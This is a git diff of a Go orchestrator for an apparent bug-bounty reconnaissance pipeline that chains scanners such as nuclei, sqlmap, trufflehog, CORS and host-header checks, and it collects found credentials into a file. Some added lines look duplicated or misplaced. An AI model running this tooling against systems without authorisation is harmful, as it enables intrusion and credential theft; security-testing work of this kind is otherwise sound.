-		// values and inspects the response for marker reflection.
-		// Catches password-reset poisoning, cache poisoning, SSRF,
-		// open-redirect chains.
+	exit 0`, findingsRunnerRef), "grep", []string{"merge_all_urls"}, 0},
 		{"hostheader_run", fmt.Sprintf(`%s hostheader . || true
-exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
-
-		// Credentialed CORS preflight check. Tests OPTIONS preflight
-		// + null-origin cases that the inline bash cors_check misses.
+	exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
 		{"cors2_run", fmt.Sprintf(`%s cors2 . || true
-exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
-
-		// ===================================================================
-		// === Phase 3: Custom nuclei template pass ========================
-		// ===================================================================
-		//
-		// The bundled nuclei-templates-rfuf/ overlay targets high-signal
-		// bug classes the default nuclei tags miss:
-		//   - debug endpoints (.env, phpinfo, server-status, ...)
-		//   - SaaS API tokens in HTML (Intercom, Mixpanel, Datadog, ...)
-		//   - JWT alg:none reflection
-		//   - host header injection via X-Forwarded-Host
-		//   - credentialed CORS preflight
-		//   - null-origin reflected with credentials
-		// Runs last so all preceding stages have populated alive.txt +
-		// tech_fingerprint.txt. Capped to ~5 templates × alive.txt hosts
-		// → bounded runtime.
+	exit 0`, findingsRunnerRef), "grep", []string{"httpx_probe"}, 0},
 		{"nuclei_rfuf_pass", fmt.Sprintf(`if [ -n "%s" ] && [ -d "%s" ]; then
-  nuclei -l nuclei_targets.txt -t "%s" %s "${AUTH_HEADERS[@]}" -o nuclei_rfuf_pass.txt || true
-else
-  echo "[!] nuclei-templates-rfuf overlay not found — skipping custom template pass"
-  : > nuclei_rfuf_pass.txt
-fi
-exit 0`, paths.NucleiTemplatesRfuf, paths.NucleiTemplatesRfuf, paths.NucleiTemplatesRfuf, nucleiOptimized), "grep", []string{"nuclei_target_merge"}, 0},
+	  nuclei -l nuclei_targets.txt -t "%s" %s "${AUTH_HEADERS[@]}" -o nuclei_rfuf_pass.txt || true
+	else
+	  echo "[!] nuclei-templates-rfuf overlay not found — skipping custom template pass"
+	  : > nuclei_rfuf_pass.txt
+	fi
+	exit 0`, paths.NucleiTemplatesRfuf, paths.NucleiTemplatesRfuf, paths.NucleiTemplatesRfuf, nucleiOptimized), "grep", []string{"nuclei_target_merge"}, 0},
 	}
 }
 
@@ -1354,13 +850,7 @@ func stageRequired(stepID string) bool {
 }
 
 func ensureZeroResultArtifacts(workDir, stepID string, outputs []string) error {
-	switch stepID {
-	case "scope_guard", "amass_enum", "subfinder", "jsmap_scrape", "hidden_params_arjun", "katana_crawl", "merge_brute_subs", "merge_js_endpoints", "dirbrute_ffuf":
-		// These discovery / merge / fuzzing stages may legitimately return zero results
-		// (exact-mode scans, no DNS-resolved brute subs, no JS endpoints, no live hosts
-		// to dirbrute). Their declared files are still required for downstream stage
-		// accounting, so materialize an empty file when the producer did not.
-	default:
+	if !softStages[stepID] {
 		return nil
 	}
 	for _, path := range outputs {
@@ -1422,8 +912,8 @@ func stageArtifacts(step Step) (inputs, outputs []string) {
 		"nuclei_target_merge": {"nuclei_targets.txt"},
 		"sqlmap_scan":         {"sqlmap_targets.txt", "sqlmap_status.json"},
 		"trufflehog_scan":     {"trufflehog_status.json", "trufflehog_results.txt"},
-		"nuclei_exposures":    {"nuclei_exposures.txt"},
-		"nuclei_misconfigs":   {"nuclei_misconfigs.txt"},
+		"nuclei_exposures":    {"credentials_found.txt"},
+		"nuclei_misconfigs":   {"misconfigs.txt"},
 		"nuclei_auth_scan":    {"auth_results.txt"},
 		"nuclei_graphql_scan": {"graphql_exposed.txt"},
 		"cors_check":          {"cors_findings.txt"},
@@ -1600,8 +1090,21 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 	maxConcurrent := 5
 	semaphore := make(chan struct{}, maxConcurrent)
 
+	records, _ := coverage.LoadStageRecords(paths.WorkDir)
 	for _, s := range steps {
 		if cp.IsCompleted(s.ID) {
+			if softStages[s.ID] {
+				isBad := false
+				for _, r := range records {
+					if r.StageID == s.ID && (r.Status == coverage.StatusTimedOut || r.Status == coverage.StatusFailed) {
+						isBad = true
+						break
+					}
+				}
+				if isBad {
+					continue // Force re-run
+				}
+			}
 			completed[s.ID] = true
 		}
 	}
@@ -1755,7 +1258,15 @@ func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTi
 					// pipeline-fatal failure.
 					emptyInput := coverage.CountMetrics(inputMetrics) == 0
 					if res.TimedOut {
-						status = coverage.StatusTimedOut
+														if softStages[step.ID] {
+									_, outputs := stageArtifacts(step)
+									_ = ensureZeroResultArtifacts(paths.WorkDir, step.ID, outputs)
+									outputMetrics = coverage.MeasureArtifacts(paths.WorkDir, outputs)
+									status = coverage.StatusCompletedEmpty
+								} else {
+									status = coverage.StatusTimedOut
+								}
+
 					} else if missingOutput && (emptyInput || res.ExitCode == 0) {
 						status = coverage.StatusCompletedEmpty
 					} else if missingOutput {
